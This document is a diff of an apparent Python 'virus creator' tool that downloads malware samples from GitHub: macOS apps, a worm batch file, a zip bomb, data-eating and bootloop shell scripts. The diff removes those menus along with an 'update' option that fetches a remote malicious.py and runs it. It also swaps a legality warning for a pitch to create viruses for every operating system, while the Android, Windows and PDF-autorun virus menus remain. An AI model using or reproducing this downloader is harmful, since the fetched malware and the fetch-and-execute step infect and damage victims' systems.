@@ -22,14 +22,14 @@ bulan = strftime("%B")
 tahun = strftime("%Y")
 #--- Def menu ---#
 def banner():
-    os.system('printf "\t\t_  _ ____ _    _ ____ _ ____ _  _ ____\n\t\t|\/| |__| |    | |    | |  | |  | [__ \n\t\t|  | |  | |___ | |___ | |__| |__| ___]\n\n" | lolcat')     
+    os.system('printf "\t\tDDDDDDDDDD EEEEEEEE AAAAAAA DDDDDDDDDD SSSSSSSS HH   HH OOOOOOO TTTTTTTTTT\n\t\t DD     DD EE       AA   AA  DD     DD SS       HH   HH OO   OO     TT     \n\t\t DD     DD EEEEEEE  AAAAAAA  DD     DD SSSSSSSS HHHHHHH OO   OO     TT    \n\t\t DD     DD EEEEEEE  AAAAAAA  DD     DD SSSSSSSS HHHHHHH OO   OO     TT \n\t\tDDDDDDDDDD EEEEEEEE AA   AA DDDDDDDDDD SSSSSSSS HH   HH OOOOOOO     TT       \n\n" | lolcat')     
     #print(""+R+"I "+C+"DDDDDDDDDD EEEEEEEE AAAAAAA DDDDDDDDDD SSSSSSSS HH   HH OOOOOOO TTTTTTTTTT "+R+"I")     
     #print(""+R+"R "+C+" DD     DD EE       AA   AA  DD     DD SS       HH   HH OO   OO     TT     "+R+"R")     
 #    print(""+R+"U "+C+" DD     DD EEEEEEE  AAAAAAA  DD     DD SSSSSSSS HHHHHHH OO   OO     TT     "+R+"U")    
 #    print(""+R+"S "+C+" DD     DD EE       AA   AA  DD     DD       SS HH   HH OO   OO     TT     "+R+"S")    
 #    print(""+R+"! "+C+"DDDDDDDDDD EEEEEEEE AA   AA DDDDDDDDDD SSSSSSSS HH   HH OOOOOOO     TT     "+R+"!")    	print("\t\t"+B+"<<<<<<| "+R+"About Tool "+B+"|>>>>>>\n")
 def about():
-	print("\t\t"+B+"<<<<<<Made For "+R+"Only Education Purpose  "+B+"|>>>>>>\n")
+	print("\t\t"+B+"<<<<<<| "+R+"Only For Education Purpose  "+B+"|>>>>>>\n")
 	print("\tAuthor  : D_E_A_D S_H_O_T \t\t\t")
 	print("\tVersion : 1.0 \t\t\t")
 	print("\tTeam    : TECH SESSION "+R+"")
@@ -604,47 +604,7 @@ def Vandroid():
 		print(""+R+"[!] This is not number")
 #################ANDROID DONE
 
-#################Start Macosx
-def Vmacosx():
-	print(""+O+"["+R+"1"+O+"] Trinoids")
-	print(""+O+"["+R+"2"+O+"] Nothing")
-	print(""+O+"["+R+"3"+O+"] Back")
-	
-	try:
-		menu2 = input("Input number > "+R+"")
-		if menu2 == 1:
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/trinoids.app?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'trinoids.app?raw=true' Macosx/Trinoids.app")
-			print(fun)#####done
-		
-		elif menu2 == 2:
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/nothing.app?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'nothing.app?raw=true' Macosx/Nothing.app")
-			print(fun)#####done
-		elif menu2 == 3:
-			print("\n")
-			menu()
-		else:
-			print(""+R+"[!] wrong number")
-	except Exception:
-		print(""+R+"[!] This is not number")
-####################Done Macosx	
+
 
 ###################Start PC
 def vpcwin():
@@ -840,97 +800,15 @@ def Vpdfautorunpc():
 		
 ######################Done pdf
 
-############Worm and Bomb zip
-def Vother():
-	print(""+O+"["+R+"1"+O+"] Worm.bat")
-	print(""+O+"["+R+"2"+O+"] Bomb.zip")
-	print(""+O+"["+R+"3"+O+"] Back")
-	
-	try:
-		menu5 = input("Input number > "+R+"")
-		if menu5 == 1:
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/worm.bat?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'worm.bat?raw=true' Worm-and-Bombzip/worm.bat")
-			print(fun)#####done
-		
-		elif menu5 == 2:
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bom-zip.zip?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'bom-zip.zip?raw=true' Worm-and-Bombzip/Bomb.zip")
-			print(fun)#####done
-		
-		elif menu5 == 3:
-			print("\n")
-			menu()	
-		else:
-			print(""+R+"[!] wrong number")
-	except Exception:
-		print(""+R+"[!] This is not number")
-		
-###############Start Shell Virus		
-def Shellvirus():
-	print(""+O+"["+R+"1"+O+"] Data-Eater.sh")
-	print(""+O+"["+R+"2"+O+"] Bootloop.sh")
-	print(""+O+"["+R+"3"+O+"] Back")
-	
-	try:
-		menu6 = input("Input number > "+R+"")
-		if menu6 == 1:
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/data-eater.sh?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'data-eater.sh?raw=true' Shell-virus/Data-Eater.sh")
-			print(fun)#####done
-			
-		elif menu6 == 2:
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bootloop.sh?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'bootloop.sh?raw=true' Shell-virus/Bootloop.sh")
-			print(fun)#####done
-		elif menu6 == 3:
-			print("\n")
-			menu()
-		else:
-			print(""+R+"[!] wrong number")
-	except Exception:
-		print(""+R+"[!] This is not number")
+
 		
 def banner2():
-	print(""+G+"Please do"+R+" NOT "+G+"use this tool for illegal activity")
-	print(""+R+"[!] "+G+"Keep legal don't illegal "+R+" [!]"+O+"")
+	print(""+G+"Do You Want Create "+R+" Virus"+G+" For Every Operating System Use this ")
+	print(""+R+"[!] "+G+"| Create By @DEADSHOT | "+R+" [!]"+O+"")
 def menu():
 	print("\n"+R+"[========== Menu ==========]"+O+"")
-	print(""+O+"["+R+"1"+O+"] Android\t\t["+R+"4"+O+"] Pdf Autorun PC\t\t["+R+"7"+O+"] Update tool")
-	print(""+O+"["+R+"2"+O+"] Macosx\t\t["+R+"5"+O+"] Other\t\t\t["+R+"8"+O+"] About")
-	print(""+O+"["+R+"3"+O+"] Windows\t\t["+R+"6"+O+"] Shell\t\t\t["+R+"9"+O+"] Exit")
+	print(""+O+"["+R+"1"+O+"] Android\t\t["+R+"3"+O+"] Pdf Autorun PC\t\t")
+	print(""+O+"["+R+"2"+O+"] Windows\t\t["+R+"9"+O+"] Exit")
 	try:
 		menu = input("\nInput Number > "+R+"")
 		if menu == 1:
@@ -938,35 +816,11 @@ def menu():
 			Vandroid()
 		elif menu == 2:
 			os.system("clear")
-			Vmacosx()
+			vpcwin()
 		elif menu == 3:
 			os.system("clear")
-			vpcwin()
-		elif menu == 4:
-			os.system("clear")
 			Vpdfautorunpc()
-		elif menu == 5:
-			os.system("clear")
-			Vother()
-		elif menu == 6:
-			os.system("clear")
-			Shellvirus()
-		elif menu == 7:
-			os.system("clear")
-			print(""+G+"")
-			chunk_size = 1024
-			url = 'https://github.com/CyberEr0r/Malicious/blob/master/malicious.py?raw=true'
-			r = requests.get(url, stream = True)
-			size = int(r.headers['content-length'])
-			filename = url.split('/')[-1]
-			with open(filename, 'wb') as f:
-				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
-					f.write(data)
-			os.system("mv 'malicious.py?raw=true' malicious.py")
-			os.system("python2 malicious.py")
-		elif menu == 8:
-			os.system("clear")
-			about()
+
 		elif menu == 9:
 			fontcolor()
 			os.system("clear")
